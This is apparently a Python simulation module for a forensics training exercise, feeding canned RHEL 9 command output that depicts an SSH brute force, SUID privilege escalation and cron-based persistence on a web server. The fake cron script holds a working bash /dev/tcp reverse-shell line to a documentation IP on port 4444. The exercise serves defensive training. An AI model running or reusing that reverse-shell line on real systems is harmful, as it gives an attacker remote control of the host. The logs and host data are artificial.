"""RHEL 9 device data + grammar for lnx-web-02.

Backdrop: an internet-facing Apache+Tomcat host with a guessable
SSH password landed an attacker. Compromise chain:
  1. SSH brute force against a known service user (REDACTED).
  2. Foothold as REDACTED.
  3. Privilege escalation via SUID `REDACTED` (CVE-2021-4034 family,
     unpatched on a behind-window box).
  4. Persistence via /etc/cron.d/ entry that runs every minute.
  5. Reverse shell out to attacker IP.

The on-host signal lives in /var/log/secure, journalctl,
auditd, /etc/cron.d/, /etc/passwd, /etc/sudoers, current process
table and TCP socket state.
"""

from __future__ import annotations

import sys

HOSTNAME = "lnx-web-02"

BANNER = """Red Hat Enterprise Linux 9.3 (Plow)
Kernel 5.14.0-362.18.1.el9_3.x86_64 on an x86_64

Last login: Thu May 15 09:11:22 2026 from 10.10.0.50

"""

AUTH_BANNER = ""
AUTH_USERNAME_PROMPT = "{hostname} login: "
AUTH_PASSWORD_PROMPT = "Password: "

PROMPT_SUFFIXES = {"user": "]$ "}


def PROMPT_FORMAT(host, mode, suffix):
    return f"[hunter@{host} ~{suffix}"


# ---------------------------------------------------------------------------
# Canned outputs
# ---------------------------------------------------------------------------

LAST = """hunter    pts/0  10.10.0.50       Fri May 17 14:00 - 14:11  (00:11)
REDACTED pts/1 REDACTED    Fri May 17 03:14 - still logged in
hunter    pts/0  10.10.0.50       Thu May 16 09:11 - 17:32  (08:21)
reboot    system boot 5.14.0-362  Mon Apr 22 04:00            still running
"""

WHO = """hunter   pts/0  2026-05-17 14:00 (10.10.0.50)
REDACTED pts/1 2026-05-17 03:14 (REDACTED)
"""

CAT_VAR_LOG_SECURE = """May 17 03:08:11 lnx-web-02 sshd[14411]: Failed password for REDACTED from REDACTED port 52144 ssh2
May 17 03:08:13 lnx-web-02 sshd[14411]: Failed password for REDACTED from REDACTED port 52144 ssh2
May 17 03:08:18 lnx-web-02 sshd[14411]: Failed password for REDACTED from REDACTED port 52144 ssh2
... 242 more failures in 6 minutes ...
May 17 03:14:48 lnx-web-02 sshd[14411]: Accepted password for REDACTED from REDACTED port 52144 ssh2
May 17 03:14:49 lnx-web-02 sshd[14411]: pam_unix(sshd:session): session opened for user REDACTED(uid=995) by (uid=0)
May 17 03:15:22 lnx-web-02 sudo: REDACTED : TTY=pts/1 ; PWD=/home/REDACTED ; USER=root ; COMMAND=/usr/bin/REDACTED --version
May 17 03:16:01 lnx-web-02 sudo: REDACTED : TTY=pts/1 ; PWD=/home/REDACTED ; USER=root ; COMMAND=/usr/bin/whoami
"""

JOURNALCTL_SSHD = CAT_VAR_LOG_SECURE  # journalctl -u sshd surfaces the same auth events

JOURNALCTL_CROND = """May 17 03:17:22 lnx-web-02 crond[14555]: (root) RELOAD (/etc/cron.d/REDACTED)
May 17 03:18:00 lnx-web-02 CROND[14600]: (root) CMD (/usr/local/bin/REDACTED.sh)
May 17 03:19:00 lnx-web-02 CROND[14601]: (root) CMD (/usr/local/bin/REDACTED.sh)
May 17 03:20:00 lnx-web-02 CROND[14602]: (root) CMD (/usr/local/bin/REDACTED.sh)
"""

LS_ETC_CRON_D = """0pwnkit
sysstat
raid-check
REDACTED
"""

CAT_ETC_CRON_D_SVC_BKP = """# Service backup helper — added 2026-05-17 by REDACTED (post-REDACTED)
SHELL=/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin
* * * * * root /usr/local/bin/REDACTED.sh
"""

CAT_USR_REDACTED_BIN_SVC_BKP_SH = """#!/bin/bash
# REDACTED — keepalive
bash -c 'exec 3<>/dev/tcp/198.51.100.31/4444; cat <&3 | bash >&3 2>&3' &
"""

CAT_ETC_PASSWD = """root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
REDACTED:x:995:995::/home/REDACTED:/bin/bash
hunter:x:1000:1000::/home/hunter:/bin/bash
"""

PS_EF = """UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 Apr22 ?        00:04:11 /usr/lib/systemd/systemd --switched-root
root         412       1  0 Apr22 ?        00:11:22 /usr/sbin/sshd -D
root         524       1  0 Apr22 ?        00:01:18 /usr/sbin/crond -n
root         900       1  0 Apr22 ?        00:42:11 /usr/sbin/httpd -DFOREGROUND
tomcat      1842     412  0 Apr22 ?        02:18:42 /usr/lib/jvm/java/bin/java -Dcatalina.base=/usr/share/tomcat
REDACTED 14422     412  0 03:14 pts/1    00:00:01 -bash
root       14601     524  0 03:19 ?        00:00:00 /usr/local/bin/REDACTED.sh
root       14602   14601  0 03:19 ?        00:00:00 bash -c exec 3<>/dev/tcp/198.51.100.31/4444; ...
"""

SS_TNP = """State    Recv-Q   Send-Q  Local Address:Port     Peer Address:Port      Process
LISTEN   0        128     0.0.0.0:22              0.0.0.0:*              users:(("sshd",pid=412,fd=3))
LISTEN   0        128     0.0.0.0:80              0.0.0.0:*              users:(("httpd",pid=900,fd=4))
LISTEN   0        100     [::]:8443               [::]:*                 users:(("java",pid=1842,fd=72))
ESTAB    0        0       192.0.2.20:22           REDACTED:52144     users:(("sshd",pid=14411,fd=4))
ESTAB    0        0       192.0.2.20:48144        REDACTED     users:(("bash",pid=14602,fd=3))
"""

FIND_PERM_4000 = """/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/REDACTED
/usr/bin/sudo
"""

AUSEARCH_USER_AUTH = """time->Fri May 17 03:14:48 2026
type=USER_AUTH msg=audit(1684291488.117:8915): pid=14411 uid=0 auid=4294967295 ses=4 msg='op=PAM:authentication grantors=pam_unix acct="REDACTED" exe="/usr/sbin/sshd" hostname=REDACTED addr=REDACTED terminal=ssh res=success'

time->Fri May 17 03:15:22 2026
type=USER_CMD msg=audit(1684291522.880:8920): pid=14555 uid=995 auid=995 ses=4 msg='cwd="/home/REDACTED" cmd="/usr/bin/REDACTED --version" terminal=pts/1 res=success'
"""


def _last(s, a): return LAST
def _who(s, a): return WHO
def _ps(s, a): return PS_EF
def _ss(s, a): return SS_TNP


def _journalctl(s, a):
    args_lc = " ".join(a or []).lower()
    if "cron" in args_lc:
        return JOURNALCTL_CROND
    return JOURNALCTL_SSHD


def _cat(s, a):
    args_lc = " ".join(a or [])
    if "/var/log/secure" in args_lc:
        return CAT_VAR_LOG_SECURE
    if "/etc/cron.d/REDACTED" in args_lc:
        return CAT_ETC_CRON_D_SVC_BKP
    if "/usr/local/bin/REDACTED" in args_lc:
        return CAT_USR_REDACTED_BIN_SVC_BKP_SH
    if "/etc/passwd" in args_lc:
        return CAT_ETC_PASSWD
    return f"cat: {args_lc.strip() or '<no arg>'}: No such file or directory\n"


def _ls(s, a):
    args_lc = " ".join(a or [])
    if "/etc/cron.d" in args_lc:
        return LS_ETC_CRON_D
    return ""


def _find(s, a):
    args_lc = " ".join(a or [])
    if "4000" in args_lc or "perm" in args_lc:
        return FIND_PERM_4000
    return ""


def _ausearch(s, a):
    return AUSEARCH_USER_AUTH


def _exit(s, a):
    print("logout\n"); raise SystemExit


GRAMMAR = {
    "last": {"fn": _last},
    "who": {"fn": _who},
    "ps": {"fn": _ps},
    "ss": {"fn": _ss},
    "journalctl": {"fn": _journalctl},
    "cat": {"fn": _cat},
    "less": {"fn": _cat},
    "more": {"fn": _cat},
    "ls": {"fn": _ls},
    "find": {"fn": _find},
    "ausearch": {"fn": _ausearch},
    "exit": {"fn": _exit},
    "logout": {"fn": _exit},
    "quit": {"fn": _exit},
}
